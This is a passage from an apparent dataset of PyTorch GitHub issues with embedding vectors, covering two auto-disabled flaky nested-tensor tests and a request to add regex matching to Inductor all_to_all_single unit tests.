  0.1633021   0.14988448 -0.06152452  0.16188514 -0.4017901  -0.12884644
  0.0877161   0.2960172   0.49966374  0.13571316 -0.2578882   0.07894271
 -0.29899377  0.20054296 -0.3028595  -0.20762    -0.16279304 -0.01677242
  0.3678896   0.31449866 -0.04173435 -0.05979026  0.43927115  0.36048135
 -0.2552756  -0.17884465 -0.13947952  0.13711813  0.00106731  0.00611115
 -0.17114641  0.24223053 -0.01748769 -0.25693154 -0.3181678   0.15579198
 -0.08699241  0.12651315 -0.28810394  0.17631587 -0.69239664  0.10427152
  0.14298418 -0.16979444 -0.0567462   0.4158383   0.05478908 -0.07317834
  0.14568177  0.12656048  0.15273899  0.3701805  -0.20975436  0.3093642
  0.03084792  0.3026849   0.48307517 -0.37416476 -0.2100286   0.24367863
 -0.390284   -0.01361403  0.08590584  0.18282595 -0.39508042  0.15383305
 -0.51107454 -0.2248905  -0.32862824 -0.09047727  0.10591742 -0.12093622
  0.1004625  -0.06739444  0.16601846 -0.14270481  0.17921975  0.0724603
  0.48628804 -0.34425458  0.22818397  0.40306938  0.16864799  0.23495156
  0.12582916 -0.40549806 -0.0070175  -0.20362467 -0.0180735  -0.3277328
  0.10406126  0.4763517   0.218178    0.0668726   0.05963705 -0.08657871
  0.25105315  0.05207529  0.10469818 -0.1808114   0.21688119 -0.02737862
  0.26500323  0.04142179 -0.345913   -0.03233121 -0.49263984  0.20026386
  0.31453156  0.20071203  0.15581118  0.12216395  0.0778121   0.06373972
  0.07244585 -0.02470107  0.10460524 -0.26443172  0.37997147 -0.09213979
 -0.07566571  0.2088258   0.1573741   0.1092485  -0.2584741  -0.54923034
 -0.0872875   0.02224196 -0.44341296 -0.14764443 -0.15850732 -0.12462713
  0.4007325   0.57422405 -0.3197453   0.45622414  0.04273177  0.11935487
 -0.08443339 -0.00807991 -0.23831542  0.34118682  0.03928664  0.06065008
  0.6070628  -0.14851001 -0.15500847 -0.6322408   0.05538967  0.21236801
 -0.0195109   0.01968622 -0.13679045  0.0987529  -0.2830067   0.00260594
 -0.60424095 -0.11547799  0.41940248  0.28272158 -0.1902888   0.06701075
  0.09093106  0.09500032 -0.22336219 -0.5478707  -0.14647603  0.3147363
 -0.1373244   0.42185247 -0.00704256 -0.04621088 -0.21201064  0.07423326
  0.08659122 -0.04953246  0.31522286 -0.01327101 -0.00186594 -0.39990225
  0.21920323  0.02609894 -0.17080174 -0.02060837  0.72343075  0.39420635
 -0.17753221  0.14613345 -0.2973128   0.33707577  0.25898814 -0.01125143
  0.4786233  -0.03105312 -0.2976488  -0.19484964 -0.22626886  0.16820635
 -0.32194826 -0.05596562 -0.24887958 -0.41818792 -0.3188707   0.54943573
  0.26322365 -0.079345    0.09455884 -0.22705388 -0.16845946 -0.10495244
 -0.2214396  -0.3543064   0.02800982  0.0749516  -0.16326731  0.1728659
  0.00613892  0.09690018 -0.17576677  0.12945221  0.8273748  -0.29768437
  0.22017214  0.34775758 -0.0545886  -0.2957238   0.08469628  0.35448673
 -0.07076003  0.15566906 -0.03301563 -0.03520226 -0.07922725 -0.22345273
 -0.36335206 -0.32354963 -0.4445591   0.2217705  -0.28354886 -0.48871356
  0.08189993  0.02331339  0.59295344  0.0256964  -0.72331774 -0.3433337
  0.23274478  0.03988987  0.01296369  0.2023949  -0.2776968   0.50288993
  0.35334197  0.03969987 -0.30783543  0.02967715  0.04749202 -0.19194882
  0.07256754 -0.6783777   0.5850685   0.31921557  0.38932005  0.01249651
  0.22790524 -0.09733756 -0.14607793  0.12945127 -0.17477414  0.55840886
 -0.16204363 -0.11374391  0.3206123   0.06132246 -0.11767086 -0.3811021
 -0.49166054 -0.30128068 -0.04135032  0.08583206  0.6476934  -0.2299811
 -0.0492636   0.06056993 -0.16476458  0.2881567   0.32350987 -0.02232293
 -0.4510803  -0.0506132  -0.07232976  0.06934896  0.3869323   0.22642925
  0.14383778  0.39239308 -0.01650492 -0.38375133  0.76691943  0.20583786
 -0.31493306  0.01177359 -0.14789231  0.04505581  0.12224958  0.6755142
  0.23387444  0.06687982 -0.04979488 -0.43371427 -0.43396434  0.18905087
  0.16941911 -0.26307714 -0.32484347  0.16459891 -0.22317526 -0.29163355
  0.2277556   0.30990234 -0.14117876 -0.20051917 -0.00742749  0.05395849
 -0.2802704   0.4375788   0.09850825 -0.43403625  0.01437196 -0.10408656
  0.2209459  -0.34993035 -0.11366452 -0.35355535  0.22239348  0.36008984
 -0.17745136 -0.0290443   0.514924   -0.10604354 -0.17302325 -0.02568419
 -0.14964503  0.41727448  0.04281691  0.19355397 -0.05075727  0.5607295
 -0.35364693 -0.14850998 -0.1480474  -0.519929   -0.10332333 -0.3961532
 -0.00162718 -0.07714628  0.00960976  0.05088783 -0.1911543   0.19400494
 -0.33980024  0.16291846  0.1880289   0.28420448  0.22861552  0.13673949
  0.182917   -0.27115262 -0.39822087  0.18963014  0.13648896 -0.20495403]"
DISABLED test_nested_tensor_indexing_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17964762574).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ResponseTimeoutError: Response timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py 200 (connected: true, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 1)
headers: {""connection"":""keep-alive"",""content-length"":""138378"",""cache-control"":""max-age=300"",""content-security-policy"":""default-src 'none'; style-src 'unsafe-inline'; sandbox"",""content-type"":""text/plain; charset=utf-8"",""etag"":""\""70598adce2f7ea59edca2428ad327477a96eef2dedf5f0a03a7d6652f963cacf\"""",""strict-transport-security"":""max-age=31536000"",""x-content-type-options"":""nosniff"",""x-frame-options"":""deny"",""x-xss-protection"":""1; mode=block"",""x-github-request-id"":""B9FA:1CF1:134794:17BEC8:6536BDE5"",""accept-ranges"":""bytes"",""date"":""Mon, 23 Oct 2023 18:39:34 GMT"",""via"":""1.1 varnish"",""x-served-by"":""cache-sjc1000104-SJC"",""x-cache"":""MISS"",""x-cache-hits"":""0"",""x-timer"":""S1698086374.139982,VS0,VE192"",""vary"":""Authorization,Accept-Encoding,Origin"",""access-control-allow-origin"":""*"",""cross-origin-resource-policy"":""cross-origin"",""x-fastly-request-id"":""1296da4d8db7f56738313a7143ecc245638da458"",""expires"":""Mon, 23 Oct 2023 18:44:34 GMT"",""source-age"":""0""}

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.08580935e-01 -1.28982782e-01 -1.37962312e-01  5.42949885e-02
  1.39331460e-01 -4.22143698e-01  9.41275805e-02 -4.38479148e-02
 -2.52079904e-01 -2.48748869e-01  3.28743458e-01 -1.23714492e-01
  1.47633806e-01  1.12793125e-01 -1.97550461e-01 -4.69752923e-02
 -2.22134739e-01 -1.59119949e-01  3.49324882e-01  1.21848118e-02
 -2.86485493e-01 -7.32226446e-02 -3.24919999e-01  2.19687566e-01
  1.80353522e-01  5.36787789e-03 -2.15335399e-01 -5.34161292e-02
  1.64150804e-01  1.33716404e-01  4.30706918e-01  1.05569310e-01
 -3.38736475e-01  3.40550616e-02  4.31681812e-01  1.90135270e-01
 -1.27784148e-01 -7.46942535e-02 -2.48294607e-01 -1.95549548e-01
  2.62608439e-01  3.01164538e-02  1.21899411e-01 -1.98041499e-01
  2.74644643e-01 -2.55649798e-02 -1.32417902e-01  6.37162402e-02
 -2.38073051e-01 -5.32739460e-02  6.61485568e-02 -1.02695443e-01
 -9.02707353e-02 -4.25397873e-01 -6.60277251e-03 -1.49453312e-01
  1.96114168e-01  2.93057770e-01  1.64895758e-01  1.28939241e-01
  6.46380708e-02 -9.76435840e-04 -8.68470520e-02 -6.77963048e-02
 -3.13082263e-02  2.87702344e-02  2.70239413e-01 -2.44929150e-01
  5.31053424e-01 -2.77595054e-02  2.65723944e-01  2.00874135e-02
 -3.13738465e-01  1.32965911e-02  1.38041258e-01  3.01470131e-01
 -1.29835725e-01  7.93885291e-02  8.84773433e-02 -2.16789879e-02
 -1.75778806e-01  8.17466341e-03  1.19909853e-01 -1.28322273e-01
  2.26184934e-01  2.49090120e-02  2.03792229e-01 -1.49431545e-02
  3.14189196e-01 -3.31323653e-01  3.83449048e-01  1.94020316e-01
 -2.48538598e-01 -4.79094572e-02  2.36784294e-02 -2.98012439e-02
  3.72405857e-01 -7.46481866e-02 -2.29853049e-01  1.65591270e-01
 -5.87969180e-03 -3.23181570e-01 -1.42030746e-01  3.79145056e-01
 -2.13465601e-01 -7.67458379e-02  3.14847618e-01  4.33368329e-03
  6.58644885e-02 -9.33513045e-02  2.29629785e-01 -7.57195503e-02
  1.34330630e-01  1.79492563e-01  1.62602663e-02 -8.46375898e-02
 -1.16628483e-01 -5.61442859e-02  1.25770837e-01  6.12259269e-01
 -3.62640858e-01 -1.48962632e-01  1.33169264e-01 -2.36631408e-02
  3.15042168e-01  6.19904771e-02 -1.29078090e-01  8.25727358e-04
  8.83199871e-02 -1.04628488e-01  2.87307147e-02 -2.47268891e-03
 -2.86903560e-01 -1.30785376e-01  3.20885144e-02  6.97747320e-02
 -1.15726613e-01 -2.19625324e-01 -4.59893122e-02  1.67236626e-01
 -2.33848184e-01  8.46312344e-02  6.95525110e-03 -2.09785283e-01
  3.55807990e-01  1.67094730e-02 -2.35359728e-01  5.43448292e-02
 -1.35831952e-01  2.29270905e-02  1.44867823e-02  1.97720863e-02
  2.10221931e-01  4.09831822e-01 -1.89119726e-02  4.00903225e-02
  3.29570889e-01  9.77916270e-02  1.38930045e-02 -1.88983873e-01
  2.27723904e-02  4.57665980e-01 -2.02690154e-01  2.37979218e-02
  2.25025654e-01 -2.04393025e-02 -4.08465803e-01  4.07177955e-04
 -1.49589740e-02  1.95624635e-01 -7.52976611e-02 -4.93458398e-02
 -9.09219868e-03  1.18995167e-01  6.41030073e-02 -1.10819951e-01
  2.61458993e-01 -4.72462803e-01 -1.47142887e-01  2.48275638e-01
  1.78364646e-02 -6.68403655e-02  2.05662668e-01  1.42344415e-01
 -4.20291312e-02  9.34533402e-02  2.45750427e-01 -1.47913530e-01
  5.19125946e-02 -1.22767463e-02 -4.04963195e-01 -2.32538998e-01
  1.36127517e-01  7.96187203e-03 -1.66826800e-01 -1.52171835e-01
  1.15040570e-01 -1.44595966e-01 -9.37649142e-03 -7.36016780e-04
 -8.50485787e-02  1.76510528e-01  2.29439378e-01 -9.48419869e-02
  8.24512839e-02 -1.32256970e-01 -1.47377610e-01 -3.11632782e-01
  7.29339719e-02  7.65268281e-02 -1.61098093e-01 -2.05172271e-01
 -1.01254955e-01 -3.05090010e-01 -3.34149785e-02 -4.43164483e-02
 -8.61377567e-02 -1.53771922e-01 -1.29748687e-01  2.85653889e-01
 -1.78167224e-01 -1.09826557e-01 -2.86868334e-01 -1.32597938e-01
 -4.14214134e-01 -2.06525832e-01 -2.17410147e-01  1.85281247e-01
 -1.57562375e-01  4.72909957e-02 -5.94753325e-02 -1.47457764e-01
  2.20918760e-01 -3.68949547e-02  3.23031962e-01 -3.16926837e-01
 -4.05985177e-01 -8.59750211e-02  8.12120959e-02  4.72341806e-01
 -5.64775825e-01 -4.21447456e-01 -4.42483313e-02  1.36372179e-01
 -7.91233182e-02  1.11774199e-01 -7.01474622e-02 -2.84026992e-02
 -2.31240883e-01  1.22445367e-01 -3.49083170e-02 -4.05188560e-01
  1.32459462e-01  2.02123411e-02  1.53914690e-01  3.28741103e-01
  2.15783045e-02  1.66064546e-01  7.57430345e-02  1.47590227e-02
  2.20813856e-01  2.12046385e-01 -1.70738518e-01  4.07080889e-01
  1.16253234e-01  2.83398449e-01 -2.58928895e-01  2.59198517e-01
 -9.71523114e-04 -1.06438369e-01  3.06737036e-01 -3.19368929e-01
  2.94576995e-02 -5.06068394e-02  2.08780348e-01 -2.32442886e-01
  3.58397424e-01  2.26718277e-01 -1.31126270e-01 -3.74899879e-02
  2.92071730e-01  2.10387170e-01 -2.89814442e-01 -6.86374903e-02
  1.80259291e-02 -3.36041451e-01 -2.24759772e-01 -8.31554383e-02
 -2.20015466e-01  6.24078419e-03 -1.53325528e-01  1.68346792e-01
  2.74010897e-02 -9.29787196e-03 -4.45690185e-01  1.16510682e-01
  3.22640300e-01 -2.71859765e-01  5.12926579e-02 -4.95637842e-02
 -6.62459508e-02  3.36323008e-02  1.64859116e-01 -3.69399369e-01
  9.44506079e-02 -4.33216579e-02  2.27331787e-01  5.44661544e-02
  3.47240269e-01 -3.72730136e-01  1.30206615e-01  1.59388483e-01
 -2.58395094e-02  2.70004272e-01  1.66756123e-01 -7.91127458e-02
 -1.87359303e-01  3.91490579e-01  6.98438734e-02  1.68346629e-01
  2.82078505e-01 -1.84445798e-01 -3.17352772e-01  1.93254203e-01
  1.13088489e-01 -5.97003549e-02 -2.85244405e-01 -6.44787252e-02
 -1.22733563e-01  1.84806883e-02 -1.34078830e-01 -2.93357611e-01
 -2.75563121e-01 -1.16735034e-01 -9.49279219e-03 -1.89289227e-01
 -1.98033303e-01  3.89954209e-01  1.09923091e-02 -2.28175521e-01
  1.51813924e-01  1.22109912e-02  1.11891165e-01 -3.08684856e-01
 -6.48144633e-02 -1.11382544e-01  2.84596980e-01  2.29572937e-01
  1.49413109e-01  9.92786661e-02 -1.17038473e-01  5.01250662e-02
 -2.87590206e-01 -1.72596779e-02  1.49012327e-01  5.67700505e-01
  9.58347619e-02  2.58782133e-02  1.74283206e-01  5.58896840e-01
 -1.62225828e-01 -3.27606127e-02 -3.19986045e-01 -3.59699070e-01
  3.16099346e-01 -1.04539514e-01 -1.07994676e-01 -1.22428797e-01
  2.41350681e-01  3.17386925e-01 -3.74911517e-01  2.16578811e-01
 -1.04328230e-01  2.51154065e-01  2.22241580e-01 -2.28685394e-01
  1.59996189e-02 -9.55355465e-02  9.74786282e-03 -6.65568560e-02
  6.82167709e-02  9.86442640e-02 -4.41928953e-02  1.23928577e-01]"
DISABLED test_nested_tensor_chunk_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17948126395).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.42038417 -0.01665252 -0.30706987 -0.07824492 -0.06910142 -0.42599428
  0.12208852  0.08198822 -0.2973645  -0.27925128  0.27845103 -0.2007669
  0.07912691  0.08561444  0.00518982 -0.07366122 -0.26167813 -0.05163333
  0.38230547  0.11188887 -0.14824644 -0.03609226 -0.41679758  0.27701557
  0.25219947  0.06485842 -0.11699662 -0.07934098  0.23448138  0.04652049
  0.42948568  0.12147585 -0.23103778  0.00911167  0.40689903  0.29789534
 -0.14151436 -0.1019222  -0.24067456 -0.16630799  0.30172896  0.1236787
  0.08811039 -0.23345792  0.25655252  0.05182305 -0.09036168  0.18952098
 -0.18163982 -0.09328321  0.0699538  -0.16023687 -0.09723765 -0.4152095
  0.04791917 -0.25272587  0.24119197  0.2320286   0.04681779  0.13231051
 -0.03415374  0.01241973  0.06050552  0.00271227 -0.08326694  0.0756503
  0.2625459  -0.31764024  0.516656   -0.04809724  0.30750597 -0.0231176
 -0.38903022  0.01667738  0.20294753  0.26421237 -0.15246084  0.11742114
 -0.008405    0.01489634 -0.30845678 -0.05264637  0.14695543 -0.06566953
  0.1909425   0.02478456  0.18690923  0.07925068  0.22669119 -0.2703658
  0.27088997  0.34940997 -0.17187077 -0.02806545 -0.11566371 -0.03394014
  0.39400947 -0.0896544  -0.37910137  0.16754593  0.09624907 -0.33075753
 -0.11947656  0.3920831  -0.08331397 -0.07682869  0.3542251  -0.09885326
  0.05567003 -0.16990586  0.14173453 -0.00474666  0.21699409  0.23416403
  0.10501514 -0.15508887 -0.17870584 -0.03894801  0.02390034  0.61785746
 -0.3347426  -0.09647852  0.06810489  0.06958972  0.29855576  0.13111988
 -0.08033756 -0.00185939  0.22110215 -0.02049505  0.05875706  0.14777116
 -0.33087698 -0.09788683  0.07013109  0.04237294 -0.23015854 -0.29562065
  0.02862631 -0.03957607 -0.1420266   0.20217803 -0.01181137 -0.32239133
  0.44223544  0.08613419 -0.20513834  0.06895677 -0.16573757  0.16449706
 -0.02211902  0.1359729   0.1914292   0.33880407  0.012631    0.02439318
  0.32422832  0.12593952 -0.08943456 -0.22736576 -0.0394728   0.45067066
 -0.13005045  0.06358086  0.30832866 -0.10479426 -0.5592203  -0.05295149
  0.14402995  0.16511407 -0.10106273 -0.01747417  0.04037386  0.04650342
 -0.00340025 -0.00935759  0.21717605 -0.5005439  -0.05721444  0.26684666
  0.10105328 -0.04443423  0.15014943  0.01746415 -0.08980814  0.11785541
  0.26187015 -0.10147466  0.02246665 -0.05081259 -0.44364986 -0.15376626
  0.1194433  -0.12444879 -0.19640219 -0.21784794  0.06885024 -0.12351197
  0.0340504   0.02238921 -0.15146518  0.15235412  0.15004547 -0.11293928
  0.16364226 -0.05635019 -0.17942041 -0.390957    0.120657    0.13149911
 -0.07274079 -0.2197395  -0.22387108 -0.2502734   0.03180896 -0.05409063
  0.05692808 -0.12236129 -0.25721967  0.22760975 -0.17474262 -0.16257852
 -0.32091856 -0.13448443 -0.47144884 -0.24266103 -0.17613599  0.19663852
 -0.05716236  0.08331773 -0.09799376 -0.16319744  0.08386061 -0.08454973
  0.34557572 -0.3969437  -0.3157941  -0.16118242  0.0105838   0.522842
 -0.54420626 -0.49336135 -0.05393366  0.11458044 -0.0354135  -0.03103985
  0.08461127  0.03134489 -0.21815549  0.20854917 -0.18117222 -0.29595223
  0.26484293  0.0402846   0.18519758  0.33416688 -0.12623668  0.05757335
 -0.00365312 -0.0039796   0.07789208  0.27461287 -0.17536937  0.350705
  0.09478404  0.21797276 -0.3153523   0.27171093  0.09662396 -0.13524716
  0.42736715 -0.2634915   0.03557914 -0.01264202  0.11681068 -0.21648267
  0.38475513  0.3430535  -0.15905148 -0.21386962  0.23724905  0.1083826
 -0.17983012 -0.07889202  0.05198142 -0.31995842 -0.16587344 -0.18852551
 -0.21159807 -0.02222974 -0.18007693  0.23134539  0.07916251 -0.01553114
 -0.3950506   0.0364791   0.4430703  -0.1939006   0.03371966 -0.08688458
 -0.07666585 -0.07534484  0.17145604 -0.3423838   0.06545515 -0.0839885
  0.22001508  0.01537907  0.3381418  -0.3255656   0.19729495  0.15250608
 -0.06158122  0.3213012  -0.02072541 -0.03195784 -0.08738124  0.51073825
  0.21298134  0.15597762  0.34359092 -0.23772582 -0.31415     0.09390388
  0.09568529 -0.14304574 -0.31780243 -0.21943521 -0.11818959 -0.05398061
 -0.1644625  -0.2372536  -0.18625137 -0.13380095 -0.07151299 -0.09210332
 -0.13349867  0.48528823 -0.00829099 -0.20378146  0.11624415 -0.17205828
  0.15727744 -0.4737653  -0.15172815 -0.18643856  0.26756436  0.15690836
  0.17560473  0.17180473 -0.1294863   0.09384645 -0.1975379  -0.05785039
  0.288953    0.4727269  -0.04191452  0.10137846  0.288019    0.51147604
 -0.2772722   0.01696784 -0.34684795 -0.35289901  0.29602966 -0.200983
 -0.08168854 -0.07735173  0.12913346  0.39152405 -0.41856748  0.35499674
 -0.09598492  0.39098075  0.15948766 -0.06780189  0.11259665 -0.0986197
  0.03371752 -0.12613852  0.01899496  0.10984481  0.0552152   0.16355646]"
Add regex matching to Inductor all2all collective unit tests good first issue triaged module: inductor,"As part of https://github.com/pytorch/pytorch/pull/110195, we added support for tracing and compiling all2all collectives, specifically passing in a list of integers for `input_split_sizes` / `output_split_sizes` args in `torch.ops.c10d_functional.all_to_all_single()`. And we expect that in the Inductor generated code, we are passing symints like `i0`, `i1` to the `input_split_sizes` / `output_split_sizes` args of `all_to_all_single()`. Values of these symints are not hardcoded and instead are populated at runtime.

The above mechanism already works today. But current unit tests only check if ""all_to_all_single"" exists in the generated code:
```python
FileCheck() \
.check(""all_to_all_single"") \
.run(code)
```
while the actual generated code looks like:
```python
buf5_work = dist.all_to_all_single(buf5[0], buf5_inputs[0], output_split_sizes=[i14, i15], input_split_sizes=[i12, i13], group=buf5_pg, async_op=True)
```
(notice i14, i15, i12, i13 are the symints)

We want to update the unit test code to check that symints are indeed used in `output_split_sizes` and `input_split_sizes` args, to prevent functionality regression. We want to do something similar to:
```python
FileCheck() \
.check_regex(""all_to_all_single(buf${buf_id}[0], buf${buf_id}_inputs[0], output_split_sizes=[i${symint_id_0}, i${symint_id_1}], input_split_sizes=[i${symint_id_2}, i${symint_id_3}], "") \
.run(code)
```
where the actual value of buf_id / symint_id_0 / symint_id_1 / symint_id_2 / symint_id_3 can be anything. We can likely achieve this via some sort of regular expression matching.

### Alternatives

_No response_

### Additional context

_No response_

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False,"[-4.10080731e-01  2.02584893e-01 -3.07297587e-01 -2.09118649e-02
 -8.37216824e-02 -2.84438103e-01  3.04601133e-01 -1.74764067e-01
 -4.33809698e-01 -3.61534119e-01  4.20089252e-02 -1.10977679e-01
 -1.75337158e-02 -3.16894986e-02  1.49411947e-01 -2.46628523e-02
 -2.74405003e-01  3.70707475e-02 -1.73806995e-01 -4.05617982e-01
  9.26222652e-02 -5.24730831e-02 -2.10094750e-01  7.88244009e-02
 -1.62448362e-02  8.15582275e-02 -2.76342817e-02 -1.54601425e-01
  3.79616916e-02 -8.66136700e-02  2.60756493e-01 -2.09789462e-02
 -7.38018528e-02  5.78557774e-02  1.27634332e-01 -1.19678400e-01
  1.07076764e-03 -9.31683928e-02 -9.89115089e-02 -1.42625362e-01
  1.53842404e-01  8.43846053e-02  3.45837064e-02 -1.03169493e-01
 -1.69589579e-01  5.76777346e-02 -3.82707208e-01  1.80570364e-01
 -2.57326365e-01 -1.91545352e-01  3.08571696e-01  1.80195451e-01
 -1.99251264e-01 -3.83304209e-02  1.61196962e-01 -2.34293193e-01
 -2.36757576e-01 -9.92953926e-02 -1.54909745e-01 -3.67666304e-01
 -1.15129232e-01  1.20532839e-03 -8.71065110e-02  1.18606061e-01
 -2.90062279e-04 -6.26830012e-02  1.62066072e-01  2.03859240e-01
  1.61851700e-02  3.34630400e-01 -5.77042028e-02 -1.18787056e-02
 -2.73985505e-01  5.27520776e-02  1.89219803e-01  1.61730886e-01
 -3.63512218e-01  2.86902368e-01  6.29221797e-02 -3.42555009e-02
 -2.31998697e-01  1.81382209e-01 -2.12340225e-02 -5.26967719e-02
  1.26104563e-01 -9.99445468e-02  4.72902730e-02  2.11959593e-02
  8.08698982e-02  2.30911952e-02  2.72567153e-01  9.91598219e-02
 -4.93947454e-02  1.96071103e-01  1.88437015e-01  4.02203172e-01
  2.08458573e-01 -2.22294390e-01  1.42541379e-01 -1.58674791e-01
 -1.37399748e-01 -2.99822628e-01 -2.50838786e-01  2.03151405e-02
 -2.90627748e-01 -1.20746627e-01  1.34423167e-01  3.06764901e-01
  3.78550798e-01 -1.63470805e-01  8.99789780e-02 -2.96426229e-02
 -1.40491635e-01  2.39450820e-02 -4.89468686e-04  9.30152610e-02
  1.97251260e-01 -2.24525873e-02  2.39731327e-01 -6.36756271e-02
 -1.95197910e-02  1.42430395e-01 -2.30010170e-02  5.17077327e-01
  3.82082015e-01  3.35255027e-01  1.69263870e-01  7.73411170e-02
  8.39412063e-02  9.82125476e-02 -5.20493463e-02 -9.58342776e-02
  1.00724753e-02  3.46409976e-02  3.78019661e-01  2.15355724e-01
 -2.40220830e-01  2.53626317e-01 -1.01062186e-01  2.10223824e-01
  7.79149905e-02  8.36981758e-02  8.42467397e-02 -1.64612651e-01
  8.83843899e-02  2.69831508e-01 -3.82002503e-01 -4.53683175e-03
  1.77321464e-01  4.31553066e-01  7.14373440e-02  1.54661918e-02
  9.27269831e-03  1.58713222e-01  6.33660257e-02 -1.61054254e-01
  7.07997903e-02  2.99627893e-02  1.40732005e-01 -6.16074428e-02
 -6.55559376e-02  4.74554479e-01  1.98150083e-01  9.50286984e-02
  1.82901412e-01  9.91209224e-02 -3.09215963e-01 -1.40794188e-01
 -2.04747587e-01  5.52988276e-02 -2.19657183e-01 -4.13937569e-01
  9.49580297e-02 -3.44763935e-01  2.91934878e-01 -1.42712027e-01
 -2.33152322e-03 -4.29840535e-02 -5.54148667e-03  2.54564971e-01
 -1.21500809e-02  2.23375499e-01  1.58421725e-01  7.16742724e-02
  1.73563987e-01  4.02158976e-01  3.90435517e-01  8.09198916e-02
 -2.27665141e-01  7.97277540e-02 -2.53722910e-02 -2.63158917e-01
 -9.39339250e-02 -9.59069058e-02  6.88099563e-02 -1.72381401e-01
 -3.05024944e-02 -6.93212152e-02 -1.79899007e-01 -1.07885234e-01
 -2.84162700e-01 -1.06283806e-01  4.52072769e-02 -1.52161658e-01
  2.88429022e-01  1.33508146e-01 -5.58832437e-02 -4.38701063e-01
 -1.47874057e-01  4.10766542e-01 -6.36773705e-02 -2.82716900e-01
 -2.91144177e-02 -1.63696259e-01 -2.44364560e-01  7.06192106e-02
 -2.65972614e-01 -7.59285912e-02  1.95400223e-01  1.89273983e-01
  2.53670722e-01 -8.09446499e-02  2.38437384e-01 -2.81956047e-01
  4.48180884e-02  2.05266587e-02  1.75530821e-01 -2.28116155e-01
  5.40378690e-02 -2.89663374e-01 -9.60834697e-02 -1.04689509e-01
  3.72461110e-01  3.75151485e-01  3.42845440e-01  2.58062243e-01
  9.29049551e-02 -1.96956202e-01  2.36213207e-03 -3.53512801e-02
 -2.28219792e-01 -2.01857671e-01  3.42572987e-01 -3.91886644e-02
  1.06930859e-01  5.36893010e-01  3.72444391e-01 -1.88636482e-01
 -2.14020997e-01  1.11958750e-01 -1.92072645e-01 -1.21056721e-01
  6.20002806e-01 -1.24234281e-01  1.07802227e-01  5.04695661e-02
  1.05874844e-01  1.30929619e-01  3.12551074e-02 -6.28882885e-01
  4.75121103e-02  5.30980229e-01  9.58264526e-03  3.71638536e-02
  4.72305305e-02  4.32270505e-02 -3.64834219e-01  4.24494505e-01
  1.51737407e-02 -2.23610193e-01  1.22214362e-01 -2.39718333e-02
  5.52845001e-02  3.23733501e-02  7.10548311e-02 -1.47668064e-01
  1.42213672e-01 -3.05528104e-01  7.97325745e-02  5.00361472e-02
  3.02883804e-01  5.66622801e-02 -1.06402233e-01  1.54506102e-01
  1.70187771e-01 -7.38314688e-02  1.93961620e-01  1.77114308e-02
 -7.37449676e-02 -9.61382240e-02 -3.11552733e-01 -8.74627680e-02
 -9.74317044e-02  4.22280282e-02 -1.71508119e-01  8.46578777e-02
 -5.42891771e-03 -2.46816650e-01  2.17312336e-01 -4.23192531e-02
 -2.77227521e-01  9.28948671e-02 -2.72090454e-02  5.10342643e-02
 -4.64442790e-01  8.76169205e-02  1.67746186e-01  2.26431608e-01
  3.03988844e-01 -3.44225407e-01  2.39064455e-01  3.48967910e-01
  8.75202417e-02  2.31613800e-01 -1.76019445e-01 -3.87009121e-02
  1.06971070e-01  4.97588009e-01 -1.21212170e-01 -6.87847659e-03
 -2.25433171e-01 -1.09032594e-01 -3.28790665e-01  1.63761199e-01
 -2.58400459e-02 -7.72182792e-02 -4.60726261e-01  8.72418508e-02
 -2.00349569e-01  1.77323163e-01  1.38061538e-01 -1.33730218e-01
  3.07315215e-02  6.29729033e-02  1.92447498e-01 -2.49621123e-01
 -3.07907946e-02  5.02195358e-02 -4.57160547e-02 -9.47755761e-04
 -3.43121111e-01 -8.41294229e-03 -1.04377083e-01 -9.32639465e-03
  4.37189862e-02  9.05913562e-02 -5.83047196e-02  2.05787569e-02
 -4.50699106e-02 -1.61062554e-02  6.43073767e-02 -1.85819268e-01
  8.33255798e-03  2.39240974e-01  3.36600617e-02  2.43688583e-01
 -5.32280505e-02  1.36238918e-01 -5.54898605e-02 -4.89404649e-02
 -2.32387781e-01  1.34229809e-01 -1.97742671e-01 -4.20136712e-02
 -4.44006175e-02 -1.29595369e-01  1.20989725e-01 -3.68182391e-01
 -2.19404519e-01  1.54060453e-01 -2.16208637e-01 -4.38882336e-02
 -1.58646166e-01  6.03023469e-02  1.32910937e-01 -1.11667812e-01
